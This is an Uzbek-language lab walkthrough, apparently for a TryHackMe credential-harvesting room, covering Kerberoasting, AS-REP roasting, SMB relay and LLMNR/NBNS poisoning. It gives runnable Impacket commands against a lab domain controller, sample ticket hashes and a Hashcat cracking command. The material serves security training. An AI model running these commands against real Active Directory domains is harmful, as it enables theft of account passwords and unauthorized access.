Oldingi topshiriqlarda biz tizimga dastlabki kirish imkoni mavjud bo‘lib, tizim xotirasi yoki Windows operatsion tizimidagi turli fayllardan credential (foydalanuvchi ma’lumotlari)larni olishga harakat qilayotganimiz taxmin qilingan edi. Ammo boshqa holatlarda, tarmoq ichidagi qurbonlar tarmog‘ida credentiallarni qo‘lga kiritish uchun turli hujumlarni amalga oshirish mumkin.

Ushbu topshiriqda, credentiallarni olish uchun foydalaniladigan ba’zi Windows va Active Directory hujumlariga qisqacha kirish qilinadi. Batafsil AD hujumlariga o‘tishdan oldin, siz **Kerberos** protokoli va **New Technology LAN Manager (NTLM)** protokollar majmuasi bilan tanish bo‘lishingiz tavsiya qilinadi — ular Windowsda autentifikatsiya (foydalanuvchini tasdiqlash) uchun ishlatiladi.

---

### **Kerberoasting**

**Kerberoasting** — bu Active Directory (AD) tarmog‘ida keng tarqalgan hujum turi bo‘lib, hujumchiga AD ticket (chipta)larini olish orqali tizimda mustahkamlanish imkonini beradi. Bu hujumni amalga oshirish uchun hujumchida SPN (Service Principal Name) bo‘lgan hisoblar — masalan, `IIS`, `MSSQL` va boshqalar —ga kirish huquqi bo‘lishi kerak.

Kerberoasting hujumi quyidagicha ishlaydi:

1. Hujumchi TGT (Ticket Granting Ticket) so‘raydi.
2. So‘ngra TGS (Ticket Granting Service) ni talab qiladi.
3. Maqsad — tizimda **privilege escalation** (huquqni oshirish) va **lateral movement** (tarmoqda boshqa qurilmalarga o‘tish).

Kerberoasting bo‘yicha batafsil ma’lumot olish uchun TryHackMe’dagi **Persisting AD** xonasining 3-topshiriq bo‘limiga murojaat qilishingiz mumkin.

#### **Hujumning qisqa demo ko‘rinishi**

1. Avval SPN account(lar)ni aniqlaymiz.
2. So‘ng `TGS` ticketini olish uchun so‘rov yuboramiz.

Quyidagi buyruq bilan SPN accountlarni aniqlaymiz:

```bash
python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.201.112.212 THM.red/thm
```

> Bu yerda:
>
> * `-dc-ip` — Domain Controller manzili
> * `THM.red/thm` — domen va foydalanuvchi nomi
> * Skript parol so‘raydi

Natija quyidagicha bo‘ladi:

```
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578
```

Endi esa, `svc-user` SPN hisobiga TGS ticket olish uchun so‘rov yuboramiz:

```bash
python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.201.112.212 THM.red/thm -request-user svc-user
```

> Bu buyruq TGS ticketni beradi:

```
$krb5tgs$23$*svc-user$THM.RED$THM.red/svc-user*$8f5de4211da1cd5715217[...]7bfa3680658dd9812ac061c5
```

Endi esa, bu ticketni **Hashcat** yordamida crack qilamiz:

```bash
hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
```

> 🎯 Siz ham xuddi shu tartibda berilgan VM’ga hujum qilib ko‘ring, SPN foydalanuvchisini toping, TGS ticket oling va uni crack qilib parolni aniqlang.

---

### **AS-REP Roasting**

**AS-REP Roasting** — bu hujum texnikasi bo‘lib, hujumchiga “Kerberos oldindan autentifikatsiyani talab qilinmasin” (Do not require Kerberos pre-authentication) parametri yoqilgan foydalanuvchilarning credential hashlarini olish imkonini beradi.

Bu parametr eskirgan Kerberos autentifikatsiya usuliga asoslangan bo‘lib, parol talab qilinmasdan chipta beriladi. Hujumchi ushbu hashni olib, oflayn tarzda crack qilishi mumkin. Agar hash crack qilinsa — foydalanuvchi paroli aniqlanadi!


![](https://github.com/akhatkulov/cheatsheets-for-windows/blob/main/Credentials%20Harvesting/Other%20Attacks/Other%20Attacks.png?raw=true)


VM (Virtual Mashina) ichida **“Do not require Kerberos preauthentication”** parametri yoqilgan AD foydalanuvchilaridan biri mavjud. **AS-REP Roasting** hujumini bajarishdan oldin, foydalanuvchilar ro‘yxatini aniqlab olish kerak — bu esa enumeratsiya (foydalanuvchilarni aniqlash) bosqichida amalga oshiriladi.

Biz `users.lst` nomli faylni `/tmp` papkasi ichida yaratdik. Bu faylda quyidagi foydalanuvchilar mavjud:

```
Administrator  
admin  
thm  
test  
sshd  
victim  
CREDS-HARVESTIN$
```

---

### **AS-REP Roasting Hujumini Bajarish**

Endi esa **Impacket** paketidagi `GetNPUsers.py` skriptidan foydalanamiz:

```bash
python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.201.112.212 thm.red/ -usersfile /tmp/users.txt
```

> Bu yerda:
>
> * `-dc-ip` — Domain Controller'ning IP manzili.
> * `thm.red/` — domen nomi.
> * `-usersfile` — foydalanuvchilar ro‘yxati joylashgan fayl.

Chiqarilgan natija quyidagicha bo‘lishi mumkin:

```
[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set  
$krb5asrep$23$victim@THM.RED:166c95418fb9dc495789fe9[...]1e8d2ef27$6a0e13abb5c99c07  
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User bk-admin doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User svc-user doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User thm-local doesn't have UF_DONT_REQUIRE_PREAUTH set  
```

Faqatgina `victim` foydalanuvchisida **preauthentication** o‘chirilgan, shuning uchun uning hashini olish mumkin bo‘lgan ticket yaratildi.

---

Bu ticket'ni **Rubeus**, **John the Ripper**, yoki **Hashcat** yordamida crack qilish mumkin. `GetNPUsers.py` skriptida `-format` parametri orqali hash’ni kerakli formatda (John yoki Hashcat uchun) chiqarish ham mumkin.

---

### **SMB Relay Hujumi**

**SMB Relay hujumi** — bu NTLM autentifikatsiya mexanizmini (ya’ni NTLM challenge-response protokolini) suiste’mol qiladigan hujumdir. Bu hujumda hujumchi **Man-in-the-Middle (MitM)** uslubidan foydalanadi — ya’ni tarmoqdagi SMB paketlarini tutadi va NTLM hashlarni qo‘lga kiritadi.

> ⚠️ Hujum muvaffaqiyatli bo‘lishi uchun **SMB Signing** (imzolash) o‘chirilgan bo‘lishi shart.

**SMB signing** — bu xavfsizlik tekshiruvi bo‘lib, aloqa ishonchli manbadan kelayotganini tasdiqlaydi.

Bu hujum haqida batafsil ma’lumot olish uchun **THM Exploiting AD** (Active Directory hujumlari) xonasini ko‘rib chiqishingiz tavsiya qilinadi.

---

### **LLMNR/NBNS Poisoning (Zaharli Javoblar)**

**LLMNR (Link-Local Multicast Name Resolution)** va **NBT-NS (NetBIOS Name Service)** — bu DNS ishlamay qolganda, mahalliy tarmoqdagi qurilmalar to‘g‘ri manzilni topishlari uchun ishlatiladi.

Misol: Agar tarmoqdagi kompyuter DNS orqali boshqa kompyuter manzilini topa olmasa, u LLMNR yoki NBNS orqali “Shu kompyuterni bilasizmi?” degan multicast so‘rov yuboradi.

**LLMNR/NBNS Poisoning** hujumi quyidagicha ishlaydi:

* Hujumchi tarmoqda soxta (spoofed) manba sifatida o‘zini ko‘rsatadi.
* DNS ishlamagan holatda yuborilgan LLMNR yoki NBNS so‘rovlariga o‘z javobini yuboradi.
* Shu orqali autentifikatsiya uchun yuborilgan NTLM hash’larni qo‘lga kiritadi.

Bu hujum haqida batafsil o‘rganish uchun **THM Breaching AD** (Active Directoryga kirish) xonasiga murojaat qilishingiz mumkin.

---

### **Xulosa**

**SMB Relay** va **LLMNR/NBNS Poisoning** hujumlarining asosiy maqsadi — qurbonning NTLM hashlarini qo‘lga kiritishdir. Bu hashlar orqali esa foydalanuvchi hisoblariga yoki qurilmalarga kirish imkoni paydo bo‘ladi.
